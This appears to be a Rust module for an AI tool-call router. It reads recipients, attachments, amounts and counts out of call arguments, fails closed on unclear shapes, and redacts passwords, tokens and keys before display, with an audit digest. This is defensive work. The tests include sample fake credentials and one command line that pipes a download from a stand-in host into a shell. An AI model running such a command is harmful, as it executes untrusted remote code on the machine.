//! What rules and sheets read out of a call's exact arguments.
//!
//! The `tools.json` fields rules can match are still an open question of
//! ADR 0004 (agreed with App Hub later), so the router reads the
//! conventional argument names every system app uses today:
//!
//! | Fact | Arguments |
//! | --- | --- |
//! | recipients | `to`, `cc`, `bcc`, `recipients`, `invitees`, `attendees` (a string, a list of strings, or objects with `address`/`email`/`id`) |
//! | attachments | `attachments`, `files` (a non-empty list, or `true`) |
//! | amount | `amount`, `total`, `price` (a number or a numeric string) |
//! | count | `count`, else the number of `items`, else the number of recipients |
//!
//! **Fail closed.** Nothing here guesses in the call's favour: a missing
//! fact fails the condition that needs it, and so does one the reader
//! cannot make out. An argument anywhere in the call (at any depth) whose
//! name looks like the fact under a name the table does not list
//! (`attachment`, `file_path`, `quantity`, `share_with`, `cost`, a nested
//! `cc`), a value in a shape the reader does not know (a recipient object
//! without an address, a count that is not a whole number), or two amounts
//! that disagree: the fact is unreadable ([`Unreadable`]), and the rule
//! does not answer; the person does.

use serde_json::{Map, Value};
use sha2::{Digest, Sha256};

const RECIPIENT_KEYS: &[&str] = &["to", "cc", "bcc", "recipients", "invitees", "attendees"];
const ATTACHMENT_KEYS: &[&str] = &["attachments", "files"];
const AMOUNT_KEYS: &[&str] = &["amount", "total", "price"];
/// Words that make an argument name look like one of the facts. A name is
/// split on `_`, `-`, `.` and camel case; one word matching (or starting
/// with the stem, for `attach*`) is enough.
const RECIPIENT_WORDS: &[&str] = &[
    "to", "cc", "bcc", "recipient", "recipients", "invitee", "invitees", "attendee", "attendees", "participant", "participants", "guest", "guests", "member", "members", "email", "emails",
    "address", "addresses", "phone", "phones", "contact", "contacts", "share", "notify", "user", "users", "people", "person",
];
const ATTACHMENT_WORDS: &[&str] = &["attachment", "attachments", "file", "files", "path", "paths", "upload", "uploads", "document", "documents", "media", "image", "images", "photo", "photos", "blob", "blobs"];
const AMOUNT_WORDS: &[&str] = &["amount", "amounts", "total", "totals", "price", "prices", "cost", "costs", "fee", "fees", "sum", "payment", "subtotal", "charge"];
const COUNT_WORDS: &[&str] = &["count", "counts", "quantity", "quantities", "qty", "number", "times", "repeat", "repeats", "copies", "batch", "limit", "max", "n"];
/// A word that makes an argument's name a secret wherever it stands in the
/// name (`smtp_password`, `passwordHint`, `client_secret`). Names are split as
/// [`words`] splits them, so `pinned` and `author` are not caught.
const SECRET_WORDS: &[&str] = &[
    "password", "passwords", "passwd", "pwd", "passphrase", "passcode", "secret", "secrets", "credential", "credentials", "creds", "apikey", "privatekey", "authorization", "cookie", "cookies", "bearer", "jwt", "otp", "totp", "cvv", "cvc",
];
/// A word that makes the name a secret only when the name ends in it:
/// `access_token` is one, `token_count` is not.
const SECRET_LAST_WORDS: &[&str] = &["token", "tokens", "pin", "auth", "pass"];
/// `key` and `code` alone name all sorts of things (`reply_key`, `zip_code`);
/// with one of these before them they name a secret.
const KEY_QUALIFIERS: &[&str] = &["api", "private", "secret", "access", "signing", "signature", "ssh", "encryption", "session", "client", "master", "auth", "shared", "hmac", "license"];
const CODE_QUALIFIERS: &[&str] = &["time", "auth", "verification", "security", "recovery", "backup", "mfa", "sms", "login", "otp", "authorization"];
/// A long hexadecimal value under one of these names is what it says, not a
/// key: a person can tell a checksum from a password by its label.
const DIGEST_WORDS: &[&str] = &["sha", "sha1", "sha256", "sha512", "md5", "hash", "digest", "checksum", "commit", "etag", "revision"];
/// What starts a token of a known issuer.
const TOKEN_PREFIXES: &[&str] = &[
    "sk-", "sk_live_", "sk_test_", "rk_live_", "ghp_", "gho_", "ghu_", "ghs_", "ghr_", "github_pat_", "xoxb-", "xoxp-", "xoxa-", "xoxr-", "xoxs-", "xapp-", "AKIA", "ASIA", "AIza", "ya29.", "glpat-", "hf_", "npm_", "pypi-", "eyJ",
];
pub const REDACTED: &str = "••••••";

/// A fact the call carries in a shape (or under a name) the reader does
/// not know: every condition that needs it fails.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Unreadable;

/// The words of an argument name: `shareWith` → `share`, `with`.
pub(super) fn words(name: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut prev_lower = false;
    for c in name.chars() {
        if c == '_' || c == '-' || c == '.' || c == ' ' {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
            prev_lower = false;
            continue;
        }
        if c.is_uppercase() && prev_lower && !cur.is_empty() {
            out.push(std::mem::take(&mut cur));
        }
        prev_lower = c.is_lowercase() || c.is_ascii_digit();
        cur.extend(c.to_lowercase());
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

fn named_like(name: &str, vocabulary: &[&str]) -> bool {
    words(name).iter().any(|w| vocabulary.contains(&w.as_str()) || (vocabulary == ATTACHMENT_WORDS && w.starts_with("attach")))
}

/// Every (name, value) in the call, at any depth, except the top-level
/// keys in `skip` (the table's own, read by the fact itself) and, unless
/// `into_skipped`, what they hold.
fn walk<'a>(args: &'a Value, skip: &[&str], into_skipped: bool, out: &mut Vec<(&'a str, &'a Value)>) {
    fn inner<'a>(v: &'a Value, out: &mut Vec<(&'a str, &'a Value)>) {
        match v {
            Value::Object(map) => {
                for (k, v) in map {
                    out.push((k.as_str(), v));
                    inner(v, out);
                }
            }
            Value::Array(items) => items.iter().for_each(|i| inner(i, out)),
            _ => {}
        }
    }
    match args {
        Value::Object(map) => {
            for (k, v) in map {
                if skip.contains(&k.as_str()) {
                    if into_skipped {
                        inner(v, out);
                    }
                    continue;
                }
                out.push((k.as_str(), v));
                inner(v, out);
            }
        }
        other => inner(other, out),
    }
}

/// The other arguments named like a fact (not the table's own keys).
fn lookalikes<'a>(args: &'a Value, own: &[&str], into_own: bool, vocabulary: &[&str]) -> Vec<(&'a str, &'a Value)> {
    let mut all = Vec::new();
    walk(args, own, into_own, &mut all);
    all.into_iter().filter(|(k, _)| named_like(k, vocabulary)).collect()
}

fn addresses(v: &Value, out: &mut Vec<String>) -> Result<(), Unreadable> {
    match v {
        Value::Null => Ok(()),
        Value::String(s) => {
            for part in s.split([',', ';']) {
                let part = part.trim();
                if part.is_empty() {
                    continue;
                }
                // "Ana <ana@example.org>" → the address.
                let addr = match (part.rfind('<'), part.rfind('>')) {
                    (Some(a), Some(b)) if a < b => &part[a + 1..b],
                    _ => part,
                };
                out.push(addr.trim().to_lowercase());
            }
            Ok(())
        }
        Value::Array(items) => items.iter().try_for_each(|i| addresses(i, out)),
        Value::Object(map) => match ["address", "email", "id", "user_id"].iter().find_map(|k| map.get(*k)) {
            Some(a @ Value::String(_)) => addresses(a, out),
            _ => Err(Unreadable),
        },
        Value::Bool(_) | Value::Number(_) => Err(Unreadable),
    }
}

/// Every recipient the call names, lower-cased; unreadable when one of
/// them is in a shape the reader does not know, or the call names people
/// under another argument (at any depth).
pub fn recipients_checked(args: &Value) -> Result<Vec<String>, Unreadable> {
    let mut out = Vec::new();
    let Some(map) = args.as_object() else { return if args.is_null() { Ok(out) } else { Err(Unreadable) } };
    for key in RECIPIENT_KEYS {
        if let Some(v) = map.get(*key) {
            addresses(v, &mut out)?;
        }
    }
    if lookalikes(args, RECIPIENT_KEYS, false, RECIPIENT_WORDS).iter().any(|(_, v)| !empty(v)) {
        return Err(Unreadable);
    }
    out.sort();
    out.dedup();
    Ok(out)
}

/// Whether a value carries nothing.
fn empty(v: &Value) -> bool {
    match v {
        Value::Null => true,
        Value::Bool(b) => !*b,
        Value::Array(a) => a.is_empty(),
        Value::String(s) => s.trim().is_empty(),
        Value::Object(o) => o.is_empty(),
        Value::Number(_) => false,
    }
}

/// Whether the call carries attachments: the table's keys, or anything
/// named like an attachment at any depth (`attachment`, `file_path`, a
/// nested `attachments`), that is not empty. Fails closed: whatever the
/// reader cannot rule out counts as an attachment.
pub fn has_attachments(args: &Value) -> bool {
    let own = args.as_object().map(|m| ATTACHMENT_KEYS.iter().filter_map(|k| m.get(*k)).any(|v| !empty(v))).unwrap_or(false);
    own || lookalikes(args, ATTACHMENT_KEYS, false, ATTACHMENT_WORDS).iter().any(|(_, v)| !empty(v))
}

fn number(v: &Value) -> Result<f64, Unreadable> {
    let n = match v {
        Value::Number(n) => n.as_f64(),
        Value::String(s) => s.trim().trim_start_matches(['$', '€', '£', '¥']).replace(',', "").parse().ok(),
        Value::Object(o) => o.get("value").and_then(Value::as_f64),
        _ => None,
    };
    n.filter(|n| n.is_finite()).ok_or(Unreadable)
}

/// The amount the call names: the largest of every amount it carries
/// (`amount`, `total`, `price`, and anything named like one at any depth);
/// `None` when there is none, or one the reader cannot parse.
pub fn amount(args: &Value) -> Option<f64> {
    let own: Vec<&Value> = args.as_object().map(|m: &Map<String, Value>| AMOUNT_KEYS.iter().filter_map(|k| m.get(*k)).collect()).unwrap_or_default();
    let others = lookalikes(args, AMOUNT_KEYS, false, AMOUNT_WORDS);
    let mut max: Option<f64> = None;
    for v in own.into_iter().chain(others.into_iter().map(|(_, v)| v)) {
        let n = number(v).ok()?;
        max = Some(max.map_or(n, |m| m.max(n)));
    }
    max
}

/// How many things the call acts on: `count` (a whole number), else the
/// number of `items`, else the number of recipients (at least one).
/// Unreadable when `count` or `items` is in another shape, the recipients
/// are unreadable, or anything else is named like a count (`quantity`, a
/// nested `repeat`, a `quantity` inside one of the `items`).
pub fn count_checked(args: &Value) -> Result<u64, Unreadable> {
    if !lookalikes(args, &["count", "items"], true, COUNT_WORDS).is_empty() {
        return Err(Unreadable);
    }
    if let Some(v) = args.get("count") {
        return v.as_u64().ok_or(Unreadable);
    }
    if let Some(v) = args.get("items") {
        return v.as_array().map(|a| a.len() as u64).ok_or(Unreadable);
    }
    Ok(recipients_checked(args)?.len().max(1) as u64)
}

/// Whether an argument name is a secret: declared by the schema, or named
/// like one.
pub fn is_secret(name: &str, declared: &[String]) -> bool {
    declared.iter().any(|d| d.eq_ignore_ascii_case(name)) || named_secret(name)
}

/// Whether a name reads as a password, token or key.
fn named_secret(name: &str) -> bool {
    let words = words(name);
    let Some(last) = words.last() else { return false };
    if words.iter().any(|w| SECRET_WORDS.contains(&w.as_str())) || SECRET_LAST_WORDS.contains(&last.as_str()) {
        return true;
    }
    let before = words.len().checked_sub(2).map(|i| words[i].as_str());
    match last.as_str() {
        "key" | "keys" => before.is_some_and(|w| KEY_QUALIFIERS.contains(&w)),
        "code" | "codes" => before.is_some_and(|w| CODE_QUALIFIERS.contains(&w)),
        _ => false,
    }
}

/// Whether the name says a long hexadecimal value is a checksum or a commit.
fn names_a_digest(name: &str) -> bool {
    words(name).iter().any(|w| DIGEST_WORDS.contains(&w.as_str()))
}

/// Characters a token is made of.
fn token_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '+' | '=' | '/' | '.' | '~')
}

/// Whether a run of [`token_char`]s looks generated rather than written. Long
/// and without a word's rhythm: letter case and digits change every few
/// characters. A path or a long sentence-like slug changes rarely.
fn looks_generated(run: &str, digest_ok: bool) -> bool {
    let run = run.trim_end_matches(['.', '/', '-', '_', '~']);
    let hex = !run.is_empty() && run.chars().all(|c| c.is_ascii_hexdigit());
    if hex {
        return !digest_ok && run.len() >= 32;
    }
    if run.len() < 32 || run.starts_with('/') || run.contains("://") || run.contains("..") {
        return false;
    }
    // A UUID is an identifier, and says so by its shape.
    let parts: Vec<&str> = run.split('-').collect();
    if parts.iter().map(|p| p.len()).eq([8usize, 4, 4, 4, 12]) && parts.iter().all(|p| p.chars().all(|c| c.is_ascii_hexdigit())) {
        return false;
    }
    // Numbers, a domain or a file's name with its dots: words between them.
    if run.split('.').filter(|p| !p.is_empty()).count() > 1 && !run.starts_with("eyJ") {
        return false;
    }
    let class = |c: char| if c.is_ascii_uppercase() { 1 } else if c.is_ascii_lowercase() { 2 } else if c.is_ascii_digit() { 3 } else { 0 };
    let chars: Vec<u8> = run.chars().map(class).filter(|c| *c != 0).collect();
    let classes = [1u8, 2, 3].iter().filter(|c| chars.contains(c)).count();
    if classes < 2 || chars.len() < 24 {
        return false;
    }
    let changes = chars.windows(2).filter(|w| w[0] != w[1]).count();
    changes as f64 / chars.len() as f64 >= 0.2 && (classes == 3 || changes as f64 / chars.len() as f64 >= 0.35)
}

/// Where a token of a known issuer starts in `run`, with enough after it.
fn issued_token(run: &str) -> bool {
    TOKEN_PREFIXES.iter().any(|p| run.starts_with(p) && run.len() >= p.len() + if *p == "AKIA" || *p == "ASIA" { 16 } else { 8 })
}

/// `text` with everything that looks like a password, token or key replaced by
/// [`REDACTED`], and only that: the words around it stay exactly as they are.
/// `name` is the argument it is the value of, if any. The second value says
/// whether anything was hidden.
///
/// Heuristic by nature, and always on the side of hiding: a private key's
/// block; `Bearer` and `Basic` credentials; a URL's password; a value after a
/// secret's name (`password: hunter2`, `?token=abc`, `--api-key abc`, `curl -u
/// ana:hunter2`); tokens of known issuers; a long run of characters that looks
/// generated.
pub fn mask_text(text: &str, name: Option<&str>) -> (String, bool) {
    let digest_ok = name.is_some_and(names_a_digest);
    let (text, a) = mask_key_blocks(text);
    let (text, b) = mask_after_names(&text);
    let (text, c) = mask_url_passwords(&text);
    let (text, d) = mask_runs(&text, digest_ok);
    (text, a || b || c || d)
}

fn mask_key_blocks(text: &str) -> (String, bool) {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    let mut hid = false;
    while let Some(start) = rest.find("-----BEGIN ") {
        out.push_str(&rest[..start]);
        hid = true;
        out.push_str(REDACTED);
        let after = &rest[start + 11..];
        match after.find("-----END ") {
            Some(end) => {
                let tail = &after[end + 9..];
                let close = tail.find("-----").map_or(tail.len(), |i| i + 5);
                rest = &tail[close..];
            }
            None => {
                rest = "";
            }
        }
    }
    out.push_str(rest);
    (out, hid)
}

/// The end of a value that starts at `start`: its closing quote if it opens
/// with one, else the next space, comma, semicolon, ampersand or quote.
fn value_end(text: &str, start: usize) -> usize {
    let rest = &text[start..];
    let mut chars = rest.char_indices();
    match chars.next() {
        Some((_, q @ ('"' | '\''))) => chars.find(|(_, c)| *c == q).map_or(text.len(), |(i, _)| start + i + 1),
        _ => rest.find(|c: char| c.is_whitespace() || matches!(c, ',' | ';' | '&' | '"' | '\'' | ')' | '}' | ']' | '<' | '>')).map_or(text.len(), |i| start + i),
    }
}

/// A value right after a secret's name, in the ways text says so.
fn mask_after_names(text: &str) -> (String, bool) {
    let mut out = String::with_capacity(text.len());
    let mut hid = false;
    let mut at = 0;
    let bytes = text.as_bytes();
    while at < text.len() {
        // The next name-shaped run.
        let Some(start) = text[at..].find(|c: char| c.is_ascii_alphanumeric()).map(|i| at + i) else { break };
        let end = text[start..].find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))).map_or(text.len(), |i| start + i);
        let name = &text[start..end];
        out.push_str(&text[at..start]);
        out.push_str(name);
        at = end;
        // A flag says `-u user:password`.
        let dashed = start >= 1 && bytes[start - 1] == b'-';
        let basic_flag = dashed && (name == "u" || name == "-user" || name == "user");
        if !named_secret(name) && !basic_flag && !matches!(name.to_ascii_lowercase().as_str(), "bearer" | "basic") {
            continue;
        }
        // Skip what joins a name to its value.
        let mut value = end;
        let mut joined = false;
        // A closing quote around a JSON-like key.
        if text[value..].starts_with(['"', '\'']) && !text[value + 1..].trim_start().starts_with([':', '=']) {
            continue;
        }
        if text[value..].starts_with(['"', '\'']) {
            value += 1;
        }
        let spaces = text[value..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - value);
        let after = value + spaces;
        if text[after..].starts_with([':', '=']) {
            value = after + 1;
            value += text[value..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - value);
            joined = true;
        } else if (dashed || name.eq_ignore_ascii_case("bearer") || name.eq_ignore_ascii_case("basic")) && spaces > 0 {
            value = after;
            joined = true;
        }
        if !joined || value >= text.len() {
            continue;
        }
        // `Authorization: Bearer abc`: the scheme stays and the credential goes.
        let scheme_end = value_end(text, value);
        let word = &text[value..scheme_end];
        if word.eq_ignore_ascii_case("bearer") || word.eq_ignore_ascii_case("basic") || word.eq_ignore_ascii_case("token") {
            out.push_str(&text[end..scheme_end]);
            let next = scheme_end + text[scheme_end..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - scheme_end);
            if next >= text.len() {
                at = scheme_end;
                continue;
            }
            out.push_str(&text[scheme_end..next]);
            let close = value_end(text, next);
            out.push_str(REDACTED);
            hid = true;
            at = close;
            continue;
        }
        // Nothing there to hide: an empty value, a reference to one.
        let value_end_at = scheme_end;
        let raw = &text[value..value_end_at];
        if raw.is_empty() || raw == "\"\"" || raw == "''" {
            continue;
        }
        out.push_str(&text[end..value]);
        if basic_flag {
            // `-u ana:hunter2`: the name stays.
            match raw.find(':') {
                Some(i) => {
                    out.push_str(&raw[..=i]);
                    out.push_str(REDACTED);
                    hid = true;
                }
                None => out.push_str(raw),
            }
        } else {
            out.push_str(REDACTED);
            hid = true;
        }
        at = value_end_at;
    }
    out.push_str(&text[at..]);
    (out, hid)
}

/// `scheme://ana:hunter2@host` keeps everything but the password.
fn mask_url_passwords(text: &str) -> (String, bool) {
    let mut out = String::with_capacity(text.len());
    let mut hid = false;
    let mut rest = text;
    while let Some(i) = rest.find("://") {
        let auth = i + 3;
        out.push_str(&rest[..auth]);
        rest = &rest[auth..];
        let end = rest.find(|c: char| c.is_whitespace() || matches!(c, '/' | '?' | '#' | '"' | '\'')).unwrap_or(rest.len());
        let authority = &rest[..end];
        if let (Some(at), Some(colon)) = (authority.rfind('@'), authority.find(':')) {
            if colon < at {
                out.push_str(&authority[..=colon]);
                out.push_str(REDACTED);
                out.push_str(&authority[at..]);
                rest = &rest[end..];
                hid = true;
            }
        }
    }
    out.push_str(rest);
    (out, hid)
}

/// Tokens of known issuers and long generated runs.
fn mask_runs(text: &str, digest_ok: bool) -> (String, bool) {
    let mut out = String::with_capacity(text.len());
    let mut hid = false;
    let mut rest = text;
    while let Some(start) = rest.find(token_char) {
        out.push_str(&rest[..start]);
        rest = &rest[start..];
        let end = rest.find(|c: char| !token_char(c)).unwrap_or(rest.len());
        let run = &rest[..end];
        if issued_token(run) || looks_generated(run, digest_ok) {
            out.push_str(REDACTED);
            hid = true;
        } else {
            out.push_str(run);
        }
        rest = &rest[end..];
    }
    out.push_str(rest);
    (out, hid)
}

/// Whether a value under a secret's name can be shown: yes or no and nothing
/// say nothing of the secret (`require_password: true`), when only the name
/// made it one. A field the schema declares is always hidden.
pub(super) fn says_nothing(name: &str, value: &Value, declared: &[String]) -> bool {
    !declared.iter().any(|d| d.eq_ignore_ascii_case(name)) && matches!(value, Value::Bool(_) | Value::Null)
}

/// The arguments with every secret replaced: a secret-typed field's whole
/// value, and whatever looks like one inside any other string ([`mask_text`]).
pub fn redact(args: &Value, declared: &[String]) -> Value {
    fn inner(args: &Value, name: Option<&str>, declared: &[String]) -> Value {
        match args {
            Value::Object(map) => Value::Object(
                map.iter()
                    .map(|(k, v)| {
                        let v = if is_secret(k, declared) && !says_nothing(k, v, declared) { Value::String(REDACTED.into()) } else { inner(v, Some(k), declared) };
                        (mask_text(k, None).0, v)
                    })
                    .collect(),
            ),
            Value::Array(items) => Value::Array(items.iter().map(|v| inner(v, name, declared)).collect()),
            Value::String(s) => Value::String(mask_text(s, name).0),
            v => v.clone(),
        }
    }
    inner(args, None, declared)
}

/// The exact arguments as a sheet shows them: pretty-printed, one field per
/// line, secrets redacted. Key order is the call's own (serde_json keeps
/// insertion order only with `preserve_order`; sorted otherwise, which is
/// stable for the person too).
pub fn pretty(args: &Value, declared: &[String]) -> Vec<String> {
    let redacted = redact(args, declared);
    serde_json::to_string_pretty(&redacted).unwrap_or_default().lines().map(str::to_string).collect()
}

/// The audit's digest of the exact arguments: SHA-256 of their canonical
/// (sorted-key, compact) JSON. The log never holds the arguments.
pub fn digest(args: &Value) -> String {
    fn canonical(v: &Value) -> Value {
        match v {
            Value::Object(map) => {
                let mut keys: Vec<_> = map.keys().collect();
                keys.sort();
                Value::Object(keys.into_iter().map(|k| (k.clone(), canonical(&map[k]))).collect())
            }
            Value::Array(items) => Value::Array(items.iter().map(canonical).collect()),
            v => v.clone(),
        }
    }
    let bytes = serde_json::to_vec(&canonical(args)).unwrap_or_default();
    let hash = Sha256::digest(&bytes);
    let mut out = String::from("sha256:");
    for b in hash {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn recipients_from_every_shape() {
        let args = json!({"to": "Ana <Ana@Example.org>, bo@example.org", "cc": ["chen@example.org"], "attendees": [{"email": "ed@example.org"}]});
        assert_eq!(recipients_checked(&args).unwrap(), vec!["ana@example.org", "bo@example.org", "chen@example.org", "ed@example.org"]);
        assert!(recipients_checked(&json!({"subject": "x"})).unwrap().is_empty());
        assert_eq!(recipients_checked(&json!({"to": [{"name": "Eve"}]})), Err(Unreadable));
        assert_eq!(recipients_checked(&json!({"to": "a@x", "shareWith": "eve@x"})), Err(Unreadable), "camel case splits");
    }

    #[test]
    fn attachments_amounts_counts() {
        assert!(!has_attachments(&json!({"attachments": []})));
        assert!(has_attachments(&json!({"attachments": ["a.pdf"]})));
        assert_eq!(amount(&json!({"amount": "$1,250.50"})), Some(1250.5));
        assert_eq!(amount(&json!({"total": 9})), Some(9.0));
        assert_eq!(amount(&json!({})), None);
        assert_eq!(count_checked(&json!({"count": 7})), Ok(7));
        assert_eq!(count_checked(&json!({"items": [1, 2, 3]})), Ok(3));
        assert_eq!(count_checked(&json!({"to": ["a@x", "b@x"]})), Ok(2));
        assert_eq!(count_checked(&json!({"quantity": 2})), Err(Unreadable));
    }

    #[test]
    fn secrets_are_redacted_by_schema_and_by_name() {
        let args = json!({"user": "ana", "pw": "hunter2", "nested": {"api_key": "sk-1", "note": "hi"}});
        let lines = pretty(&args, &["pw".into()]).join("\n");
        assert!(!lines.contains("hunter2") && !lines.contains("sk-1"), "{lines}");
        assert!(lines.contains("ana") && lines.contains("hi"));
        assert!(is_secret("smtp_password", &[]));
        assert!(!is_secret("subject", &[]));
    }

    #[test]
    fn a_name_reads_as_a_secret_by_its_words() {
        for name in ["password", "smtp_password", "smtpPassword", "SMTP-Password", "passwd", "db_pwd", "passphrase", "client_secret", "secretValue", "api_key", "apiKey", "apikey", "x-api-key", "private_key", "ssh_key", "access_token", "refreshToken", "token", "auth_token", "pin", "user_pin", "otp", "one_time_code", "verification_code", "cookie", "Authorization", "credentials"] {
            assert!(is_secret(name, &[]), "{name} is a secret");
        }
        for name in ["subject", "to", "body", "author", "pinned", "token_count", "key", "reply_key", "zip_code", "keyboard", "code", "passenger", "compass", "monkey", "secretary", "auth_url"] {
            assert!(!is_secret(name, &[]), "{name} is not a secret");
        }
        assert!(is_secret("Whatever", &["whatever".into()]), "a declared field, whatever it is called");
    }

    #[test]
    fn a_secret_in_free_text_is_hidden_and_the_words_around_it_stay() {
        let masked = |s: &str| mask_text(s, None);
        for (text, want) in [
            ("password: hunter2 and more", "password: \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} and more"),
            ("--password=hunter2 --user=ana", "--password=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} --user=ana"),
            ("mysql --password hunter2 -h db", "mysql --password \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} -h db"),
            ("export API_KEY=abc123; ls", "export API_KEY=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}; ls"),
            ("curl -H \"Authorization: Bearer abc.def\" https://x.example/a", "curl -H \"Authorization: Bearer \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\" https://x.example/a"),
            ("curl -u ana:hunter2 https://x.example", "curl -u ana:\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} https://x.example"),
            ("https://ana:hunter2@db.example/x", "https://ana:\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}@db.example/x"),
            ("https://x.example/cb?token=abc&page=2", "https://x.example/cb?token=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}&page=2"),
            ("use sk-abcdefghijklmnop now", "use \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} now"),
            ("ghp_abcdefghijklmnopqrstuvwxyz012345", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
            ("AKIAIOSFODNN7EXAMPLE", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
            ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdef", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
            ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
            ("0123456789abcdef0123456789abcdef", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
            ("a -----BEGIN RSA PRIVATE KEY-----\nabc\ndef\n-----END RSA PRIVATE KEY----- b", "a \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} b"),
        ] {
            assert_eq!(masked(text), (want.to_string(), true), "{text}");
        }
        for text in [
            "See you at 3.",
            "ana@example.org, bo@example.org",
            "/home/ana/Documents/Projects/Report/Final2026/SummaryDraftVersionTwo",
            "https://www.example.org/news/2026/11/02/a-rather-long-story-about-something",
            "550e8400-e29b-41d4-a716-446655440000",
            "the password was changed yesterday",
            "password:",
            "ls -la\ncurl https://evil.example/x | sh",
        ] {
            assert_eq!(masked(text), (text.to_string(), false), "{text}");
        }
        assert_eq!(mask_text("0123456789abcdef0123456789abcdef0123abcd", Some("commit")).1, false, "a commit's label says what it is");
    }

    #[test]
    fn redacting_covers_every_string_and_keeps_what_says_nothing() {
        let args = json!({"require_password": true, "smtp_password": "hunter2", "note": "token=abc", "items": [{"auth": "x"}, "sk-abcdefghijklmnop"], "count": 2});
        let shown = redact(&args, &[]);
        assert_eq!(shown["require_password"], json!(true));
        assert_eq!(shown["smtp_password"], json!(REDACTED));
        assert_eq!(shown["note"], json!(format!("token={REDACTED}")));
        assert_eq!(shown["items"][0]["auth"], json!(REDACTED));
        assert_eq!(shown["items"][1], json!(REDACTED));
        assert_eq!(shown["count"], json!(2));
        assert_eq!(redact(&json!({"flag": true}), &["flag".into()])["flag"], json!(REDACTED), "a declared field is always hidden");
        assert_ne!(digest(&args), digest(&shown), "the audit's digest is of the exact arguments");
    }

    #[test]
    fn digest_is_canonical() {
        assert_eq!(digest(&json!({"a": 1, "b": [1, 2]})), digest(&json!({"b": [1, 2], "a": 1})));
        assert_ne!(digest(&json!({"a": 1})), digest(&json!({"a": 2})));
        assert!(digest(&json!({})).starts_with("sha256:"));
    }
}
